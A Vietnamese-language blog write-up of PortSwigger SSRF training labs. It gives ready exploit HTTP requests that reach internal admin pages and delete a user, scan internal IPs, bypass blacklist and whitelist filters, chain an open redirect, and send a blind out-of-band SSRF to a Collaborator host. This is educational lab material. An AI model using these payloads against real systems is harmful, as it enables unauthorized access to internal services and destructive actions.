---
title: "[PortSwigger Lab] - Server Site Request Forgery (SSRF)"
description: Solution of Server Site Request Forgery (SSRF) Lab
date: 2025-06-11 17:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, ssrf]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-11-portswigger-lab-ssrf/ssrf.png
    alt: Server Site Request Forgery (SSRF)
---

## Introduction
---
### **Server Site Request Forgery (SSRF)**
- **Server Site Request Forgery (SSRF)** là một lỗ hổng bảo mật web cho phép kẻ tấn công lợi dụng máy chủ để gửi các requests tới các hệ thống khác mà lẽ ra không nên được truy cập.
- Trong một cuộc tấn công **SSRF**, kẻ tấn công gửi một yêu cầu độc hại đến một máy chủ **web**. Thay vì chính trình duyệt của kẻ tấn công thực hiện yêu cầu, máy chủ **(server)** sẽ thực hiện thay, và gửi đến địa chỉ mà kẻ tấn công chỉ định.

### Impact of SSRF attacks
- **Truy cập hệ thống nội bộ (Internal Services) như:**
   -  `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` `(metadata API của cloud như AWS)`.
    - Dịch vụ quản trị cơ sở dữ liệu, `Redis`, hoặc `admin panels`.
- **Lộ thông tin nhạy cảm:** `Token`, `credentials`, thông tin nội bộ...
- **Mở rộng tấn công:** Gửi yêu cầu từ máy chủ đến hệ thống bên ngoài, khiến các cuộc tấn công dường như xuất phát từ phía `máy chủ (trusted source)`.
- **Remote code execution (RCE):** Trong một số trường hợp nghiêm trọng, **SSRF** có thể dẫn đến thực thi mã tùy ý từ xa.

## Solve SSRF Lab

| Dạng                | Ví dụ                                  |
| ------------------- | -------------------------------------- |
| Decimal (số nguyên) | `2130706433` → tương đương `127.0.0.1` |
| Octal (bát phân)    | `017700000001`                         |
| Shortened IP        | `127.1` (tương đương `127.0.0.1`)      |
| Mixed format        | `127.000.000.001` hoặc `127.0.1`       |

---
### Lab: Basic SSRF against the local server
#### Analysis
- Truy cập 1 blog bất kỳ và sử dụng chức năng **check-stock**
- Gửi request **check-stock** đến **Burp Repeater**

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Ta thấy giá trị của **stockApi** là `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1` sau khi decode
- Nó server thực hiện gửi http request để lấy dữ liệu stock
- Lợi dụng server để gửi request, lấy nội dung của trang **admin**

#### Exploit
- Thay đổi **url** đến trang **admin**

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localhost/admin
```
- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`

```html
<a href="/admin/delete?username=carlos">Delete</a>
```
- Tiếp tục gửi request đế xóa user `carlos`

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localhost/admin/delete?username=carlos
```

### Lab: Basic SSRF against another back-end system
#### Analysis
- Truy cập 1 blog bất kỳ và sử dụng chức năng **check-stock**
- Kiểm tra request, ta thấy:

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Ta thấy giá trị của **stockApi** là `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1` sau khi decode
- Nó server thực hiện gửi http request để lấy dữ liệu stock
- Lợi dụng server để gửi request, lấy nội dung của trang **admin**
- Tuy nhiên lần này trang **admin** nằm ở địa chỉ `192.168.0.X:8080`
- Ta phải tự động hóa bằng **Burp Intruder**

#### Exploit
- Gửi request đến **Burp Intruder**
- Thay đổi **url** đến trang **admin**

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://192.168.0.`1`/admin
```
- Add tại `1` 
- Chọn **Payload type: number** 
- Start 2, End 254, Step 1
- Response có status code `200` là của trang admin trả về
- Gửi request đó đến **Burp Repeater**
- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`

```html
<a href="/admin/delete?username=carlos">Delete</a>
```
- Tiếp tục gửi request đế xóa user `carlos`

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://192.168.0.71/admin/delete?username=carlos
```

> Sài **BurpSuite Pro** hoặc tạo **script** chứ không là chờ lòi dái
{: .prompt-info }

### Lab: SSRF with blacklist-based input filter
#### Analysis
- Truy cập 1 blog bất kỳ và sử dụng chức năng **check-stock**
- Kiểm tra request, ta thấy:

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Ta thấy giá trị của **stockApi** là `http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1` sau khi decode
- Nó server thực hiện gửi http request để lấy dữ liệu stock
- Lợi dụng server để gửi request, lấy nội dung của trang **admin**
- Thay đổi request và gửi lại

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localhost/admin
```
- Quan sát tab **response**, ta thấy `"External stock check blocked for security reasons"`

#### Exploit
- Thay đổi request có cả hoa và thường

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localHost/Admin
```
- Gửi lại request
- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`

```html
<a href="/admin/delete?username=carlos">Delete</a>
```
- Tiếp tục gửi request đế xóa user `carlos`

```http
POST /product/stock HTTP/2
Host: 0a9f0041032fcfa981ca345e007c00ef.web-security-academy.net

stockApi=http://localHost/Admin/delete?username=carlos
```
- Từ kịch bản khai thác cho thấy server chưa filter chặt, path ở request
- Một số cách khai thác khác 

| Kỹ thuật               | Mô tả                                                   |
| ---------------------- | ------------------------------------------------------- |
| Alternative IP formats | Bỏ qua kiểm tra trực tiếp `127.0.0.1`                   |
| Custom DNS → localhost | Dùng tên miền tùy chỉnh trỏ về IP nội bộ                |
| Obfuscation            | Mã hóa URL, thay đổi chữ hoa-thường                     |
| Redirect-based SSRF    | Dùng server trung gian để chuyển hướng                  |
| Giao thức khác         | Đổi `http` thành `https`, `gopher`, `ftp`, `file`, v.v. |

### Lab: SSRF with whitelist-based input filter
- Cấu trúc **url** chuẩn:

```text
scheme://[username[:password]@]host[:port]/path?query#fragment
```

- Truy cập 1 blog bất kỳ và sử dụng chức năng **check-stock**
- Gửi request đến **Burp Repeater**

```
POST /product/stock HTTP/2
Host: 0a2a00b90365a9bd81a2b13400cc00c5.web-security-academy.net
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

- Thử thay đổi host sang localhost

```
stockApi=http://localhost
```
Nhận được: `"External stock check host must be stock.weliketoshop.net"`

- Sử dụng lại hostname được whitelist

```
stockApi=http://stock.weliketoshop.net
```
Nhận được: `"Could not connect to external stock check service"` =>  Server đã thực sự gửi request, xác nhận có tương tác **SSRF**.

- Chèn thông tin đăng nhập (username)

```
stockApi=http://username@stock.weliketoshop.net
```
Nhận được: `"Could not connect to external stock check service"` => URL vẫn hợp lệ, parser chấp nhận `username@host`, chỉ kiểm tra phần sau @.

- Thêm **fragment #** vào phần username

```
stockApi=http://username#@stock.weliketoshop.net
```
Nhận được: `"External stock check host must be stock.weliketoshop.net"` => **#** khiến parser hiểu sai hostname (trước #), dẫn đến hostname không còn hợp lệ.

- Double encode fragment (#) → %2523

```
stockApi=http://username%2523@stock.weliketoshop.net
```
- Nhận được: `"Could not connect to external stock check service"`
    - `%2523` → `%23` → `#` (khi decode 2 lần)
    - Server có thể decode thêm lần nữa ở backend, dẫn đến: `http://username#@stock.weliketoshop.net`
    - Parser kiểm tra hostname là `stock.weliketoshop.net` (ok), nhưng thực chất request có thể trỏ sai.

- Thay đổi payload thành:

```http
POST /product/stock HTTP/2
Host: 0a2a00b90365a9bd81a2b13400cc00c5.web-security-academy.net
...
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```
- Nhận được tài nguyên trang **admin**
- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`

```html
<a href="/admin/delete?username=carlos">Delete</a>
```
- Tiếp tục gửi request đế xóa user `carlos`

### Lab: SSRF with filter bypass via open redirection vulnerability
- Đến 1 blog bất kỳ
- Sử dụng chức năng **check stock** và **next product**
- Gủi cả 2 request này đến **Burp Repeater**

```http
GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
Host: 0a2d005a035d055f81b5d96b0093004f.web-security-academy.net
```

- Quan sát hành vi ứng dụng: Sau khi request được gửi đi ta nhận được status code **302 (Redirect)** đến `/product?productId=2`
- Thử thay đổi path thành `https://google.com` để nó có **redirect** đến không => Thực sự **redirect**
- Thử thay đổi path thành `http://192.168.0.12:8080/admin` => found với status code **302 (Redirect)** nhưng không tải được tài nguyên này, bởi vì đây là do trình duyệt của bạn **redirect** đến `http://192.168.0.12:8080/admin` chứ không phải **server**
- Trở lại với request **check stock**

```http
POST /product/stock HTTP/2
Host: 0a2d005a035d055f81b5d96b0093004f.web-security-academy.net
...
stockApi=/product/stock/check?productId=1&storeId=1
```

- Thử `stockApi=http://192.168.0.12:8080/admin` => server không chấp nhận trực tiếp như này hoặc có thể đã kiểm tra có phải domain của chính nó hay không
- Thử `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` => Nó thực sự tải tài nguyên của trang **admin**
- Quan sát tab **response**, ta thấy có đường dẫn đẻ xóa user `carlos`

```html
<a href="/admin/delete?username=carlos">Delete</a>
```
- Tiếp tục gửi request đế xóa user `carlos`

### Lab: Blind SSRF with out-of-band detection
- Ứng dụng có một tính năng `"analytics"` chạy ở phía server.
- Khi mở trang sản phẩm, server sẽ:
    - Đọc header **Referer** trong **HTTP request**.
    - Dùng nó để gửi request **HTTP** đến chính **URL** trong **Referer** — ví dụ để thu thập số liệu truy cập.
- Gửi request có header **Referer** đến **Burp Repeater**
- Thay đổi **Referer** đến địa chỉ **Burp Collaborator** để thực hiện **ssrf**

```http
GET /product?productId=1 HTTP/2
Host: 0a72007a04fb6958801d532c00e500b5.web-security-academy.net
...
Referer: https://3quamlytf7se2w5y1jiech4e75dw1npc.oastify.com
```
- **Pool now** trong **Burp Collaborator** để nhận request đến

---
Goodluck! 🍀🍀🍀 